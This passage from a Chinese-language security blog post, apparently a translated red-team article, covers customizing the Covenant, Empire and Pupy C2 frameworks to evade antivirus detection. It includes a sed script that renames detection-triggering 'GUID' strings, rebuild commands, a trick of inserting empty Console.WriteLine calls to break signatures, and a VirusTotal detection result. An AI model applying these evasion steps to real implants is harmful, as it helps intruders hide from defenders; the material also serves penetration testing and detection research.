可执行文件，以检查是否有必要更改它们。这是一个耗时的反复试验过程，因为我经常通过替换破坏某些功能。它产生了一个单词列表，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Stage0Body</span><br><span class="line">Stage1Body</span><br><span class="line">Stage1Response</span><br><span class="line">Stage2Bytes</span><br><span class="line">ProfileHttp</span><br><span class="line">ExecuteStager</span><br></pre></td></tr></table></figure><p>使用 <a target="_blank" rel="noopener" href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a> 扫描 .NET 二进制文件，发现来自 C2-Web 站点源代码的 base64 编码的 User-Agent，base64 编码的 Hello World 以及类似于 Empire Triggers 的 C2-Server 的 URL 被标记。因此，在打开新的侦听器之前生成新的配置文件很重要：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/ProfileChange.jpg" alt=""></p><p>更改所有个人资料信息后，还有一个触发器：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/GUID.jpg" alt=""></p><p><code>GUID</code> (GrundUserID) 用于 .cs 文件以及 Covenant 的 .razor，.yaml 和 .json 文件。因此，为了避开此触发器，我在所有相应文件中进行了更改：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">find ./ -type f -name &quot;*.cs&quot; -print0 | xargs -0 sed -i &quot;s/GUID/ANOTHERID/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.razor&quot; -print0 | xargs -0 sed -i &quot;s/GUID/ANOTHERID/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.json&quot; -print0 | xargs -0 sed -i &quot;s/GUID/ANOTHERID/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.yaml&quot; -print0 | xargs -0 sed -i &quot;s/GUID/ANOTHERID/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.cs&quot; -print0 | xargs -0 sed -i &quot;s/guid/anotherid/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.razor&quot; -print0 | xargs -0 sed -i &quot;s/guid/anotherid/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.json&quot; -print0 | xargs -0 sed -i &quot;s/guid/anotherid/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.yaml&quot; -print0 | xargs -0 sed -i &quot;s/guid/anotherid/g&quot;</span><br></pre></td></tr></table></figure><p>更改所有这些值之后，我们必须取回资源文件和子模块。 之后我们可以建立 Covenant：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mv ../AssemblyReferences/ ./Data/ </span><br><span class="line">mv ../ReferenceSourceLibraries/ ./Data/ </span><br><span class="line">mv ../EmbeddedResources/ ./Data/ </span><br><span class="line">dotnet build</span><br></pre></td></tr></table></figure><p><a target="_blank" rel="noopener" href="https://gist.github.com/S3cur3Th1sSh1t/bf5935b5bff48f9f63bdbb4bcc9e8e3d">Covenant customize gist</a></p><p>我无法通过字符串替换的方法为 SMBGrunt 更改一个触发器：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/SMBGrunt.jpg" alt=""></p><p>为了解决这个问题，我手动添加了一些空的 <code>Console.Writeline(&quot;&quot;);</code> 相应行之间的语句：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/OttoSMBBypass.jpg" alt=""></p><p>这不是一个很好的解决方案，但是对于逃避的用例来说就足够了。</p><p>顺便说一下，OttoHTTP.exe 登台程序在 Virustotal 上为 21/71 的检测结果，而没有进行进一步的混淆。我认为这是一个非常可靠的结果：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/OttoHTTP.jpg" alt=""></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在我的第一篇博客文章中，我们看到了手动更改 Red-Team/Penetrationtesting 工具如何逃避 AV 检测。这次，我们发现 C2-Customization 的过程几乎相同。</p><p>对于 Empire，我们需要更改 bypass 并使用自定义侦听器选项，以及可选地修改脚本模块源代码。</p><p>对于 Pupy，我们只需要创建一个自定义的 <code>Invoke-ReflectivePEInjection.ps1</code> 并修改一些 python 代码，或者添加一个自定义的 AMSI bypass。</p><p>对于 Covenant，我们还需要更改侦听器选项和 Launcher 模板源代码的某些部分以进行规避，但是使用字符串替换构建自定义的版本相对更容易。</p><p>代码库更改得越多，防御者就越难找到受感染的系统。因此，根据攻击者的不同，通过检测明显的字符串来防御恶意软件无济于事。使用字符串替换，你还可以绕过内存扫描。</p><p>我认为逃避 AV 检测就足够了。下一篇博客文章将涵盖不同的主题。</p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者:</span> <span class="post-copyright-info"><a href="mailto:undefined">zeronohacker</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接:</span> <span class="post-copyright-info"><a href="https://zeronohacker.github.io/2020/11/23/customizing-c2-frameworks-for-av-evasion/">https://zeronohacker.github.io/2020/11/23/customizing-c2-frameworks-for-av-evasion/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明:</span> <span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zeronohacker.github.io" target="_blank">zeronohacker</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PowerShell/">PowerShell</a><a class="post-meta__tags" href="/tags/C2/">C2</a><a class="post-meta__tags" href="/tags/Pupy/">Pupy</a></div><div class="post_share"><div class="social-share" data-image="https://image.zeronohacker.com/top_img/2020/11/23/malware-img-66.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/11/24/an-offensive-powershell-framework-nishang/"><img class="prev-cover" src="https://image.zeronohacker.com/top_img/2020/11/24/Nishang-Framework.jpg" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">一款具有攻击性的 Powershell 框架 —— Nishang</div></div></a></div><div class="next-post pull-right"><a href="/2020/11/02/an-offensive-coding-tool-powerglot/"><img class="next-cover" src="https://image.zeronohacker.com/top_img/2020/11/02/9e1b4181cdd3676d97e1e9129f63ec15.png" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">一款具有攻击性编码工具 —— Powerglot</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/11/24/an-offensive-powershell-framework-nishang/" title="一款具有攻击性的 Powershell 框架 —— Nishang"><img class="cover" src="https://image.zeronohacker.com/top_img/2020/11/24/Nishang-Framework.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-24</div><div class="title">一款具有攻击性的 Powershell 框架 —— Nishang</div></div></a></div><div><a href="/2021/03/30/decoding-malious-powershell-activity-a-case-study/" title="从一个恶意活动中学习 PowerShell 解码"><img class="cover" src="https://image.zeronohacker.com/top_img/2021/03/30/4-0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-30</div><div class="title">从一个恶意活动中学习 PowerShell 解码</div></div></a></div><div><a href="/2021/08/31/wmi-basics-part-1/" title="WMI 攻击手法研究 - 基础篇 (第一部分)"><img class="cover" src="https://image.zeronohacker.com/top_img/2021/08/31/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-31</div><div class="title">WMI 攻击手法研究 - 基础篇 (第一部分)</div></div></a></div><div><a href="/2021/09/07/wmi-classes-methods-part-2/" title="WMI 攻击手法研究 - 探索命名空间、类和方法 (第二部分)"><img class="cover" src="https://image.zeronohacker.com/top_img/2021/09/07/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-07</div><div class="title">WMI 攻击手法研究 - 探索命名空间、类和方法 (第二部分)</div></div></a></div><div><a href="/2021/09/13/wmi-registry-part-3/" title="WMI 攻击手法研究 - 与 Windows 注册表交互 (第三部分)"><img class="cover" src="https://image.zeronohacker.com/top_img/2021/09/13/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-13</div><div class="title">WMI 攻击手法研究 - 与 Windows 注册表交互 (第三部分)</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://image.zeronohacker.com/header.png" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info__name">zeronohacker</div><div class="author-info__description">There is no absolutely safe system in the world!</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zeronohacker"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://twitter.com/zeronohacker" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a><a class="social-icon" href="mailto:zeronohacker@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://zeronohacker.github.io/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell-Empire"><span class="toc-number">2.</span> <span class="toc-text">Powershell Empire</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pupy-C2"><span class="toc-number">3.</span> <span class="toc-text">Pupy C2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Covenant"><span class="toc-number">4.</span> <span class="toc-text">Covenant</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-number">5.</span> <span class="toc-text">结论</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/09/21/template-driven-av-and-edr-evasion-framework/" title="以模板驱动的逃避 AV/EDR 框架"><img src="https://image.zeronohacker.com/top_img/2021/09/21/inceptor-logo.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="以模板驱动的逃避 AV/EDR 框架"></a><div class="content"><a class="title" href="/2021/09/21/template-driven-av-and-edr-evasion-framework/" title="以模板驱动的逃避 AV/EDR 框架">以模板驱动的逃避 AV/EDR 框架</a><time datetime="2021-09-21T09:44:22.000Z" title="发表于 2021-09-21 17:44:22">2021-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/13/wmi-registry-part-3/" title="WMI 攻击手法研究 - 与 Windows 注册表交互 (第三部分)"><img src="https://image.zeronohacker.com/top_img/2021/09/13/cover.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="WMI 攻击手法研究 - 与 Windows 注册表交互 (第三部分)"></a><div class="content"><a class="title" href="/2021/09/13/wmi-registry-part-3/" title="WMI 攻击手法研究 - 与 Windows 注册表交互 (第三部分)">WMI 攻击手法研究 - 与 Windows 注册表交互 (第三部分)</a><time datetime="2021-09-13T14:46:41.000Z" title="发表于 2021-09-13 22:46:41">2021-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/07/wmi-classes-methods-part-2/" title="WMI 攻击手法研究 - 探索命名空间、类和方法 (第二部分)"><img src="https://image.zeronohacker.com/top_img/2021/09/07/cover.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="WMI 攻击手法研究 - 探索命名空间、类和方法 (第二部分)"></a><div class="content"><a class="title" href="/2021/09/07/wmi-classes-methods-part-2/" title="WMI 攻击手法研究 - 探索命名空间、类和方法 (第二部分)">WMI 攻击手法研究 - 探索命名空间、类和方法 (第二部分)</a><time datetime="2021-09-07T14:35:33.000Z" title="发表于 2021-09-07 22:35:33">2021-09-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/31/wmi-basics-part-1/" title="WMI 攻击手法研究 - 基础篇 (第一部分)"><img src="https://image.zeronohacker.com/top_img/2021/08/31/cover.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="WMI 攻击手法研究 - 基础篇 (第一部分)"></a><div class="content"><a class="title" href="/2021/08/31/wmi-basics-part-1/" title="WMI 攻击手法研究 - 基础篇 (第一部分)">WMI 攻击手法研究 - 基础篇 (第一部分)</a><time datetime="2021-08-31T14:25:57.000Z" title="发表于 2021-08-31 22:25:57">2021-08-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/30/decoding-malious-powershell-activity-a-case-study/" title="从一个恶意活动中学习 PowerShell 解码"><img src="https://image.zeronohacker.com/top_img/2021/03/30/4-0.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="从一个恶意活动中学习 PowerShell 解码"></a><div class="content"><a class="title" href="/2021/03/30/decoding-malious-powershell-activity-a-case-study/" title="从一个恶意活动中学习 PowerShell 解码">从一个恶意活动中学习 PowerShell 解码</a><time datetime="2021-03-30T13:50:59.000Z" title="发表于 2021-03-30 21:50:59">2021-03-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image:url(https://image.zeronohacker.com/top_img/2020/11/23/malware-img-66.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By zeronohacker</div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><img class="icp-icon" src="https://image.zeronohacker.com/icp.png"><span>赣ICP备20006890号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader={endLoading:()=>{document.body.style.overflow="auto",document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.body.style.overflow="",document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",preloader.endLoading())</script><div class="js-pjax"><script>function loadValine(){function e(){new Valine(Object.assign({el:"#vcomment",appId:"5zJhxW3eLTeGMw49HFsbee5P-gzGzoHsz",appKey:"GSf2czvdDct9w1M2UBwkGQ94",placeholder:"Please leave your footprints",avatar:"monsterid",meta:"nick,mail,link".split(","),pageSize:"10",lang:"zh-CN",recordIP:!1,serverURLs:"",emojiCDN:"",emojiMaps:"",enableQQ:!1,path:window.location.pathname,requiredFields:["nick,mail"],visitor:!1},null))}"function"==typeof Valine?e():getScript("https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js").then(e)}{function loadOtherComment(){loadValine()}setTimeout(loadValine,0)}</script></div><script defer id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script>!function(t,a,n){a.ChatraID="g2jne7zk7acH93cer";var c=t.createElement("script");a[n]=a[n]||function(){(a[n].q=a[n].q||[]).push(arguments)},c.async=!0,c.src="https://call.chatra.io/chatra.js",t.head&&t.head.appendChild(c)}(document,window,"Chatra");var chatBtnHide,chatBtnShow,chatBtnFn=()=>{document.getElementById("chat_btn").addEventListener("click",(function(){Chatra("openChat")}))};chatBtnFn()</script><script async data-pjax src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script></body></html>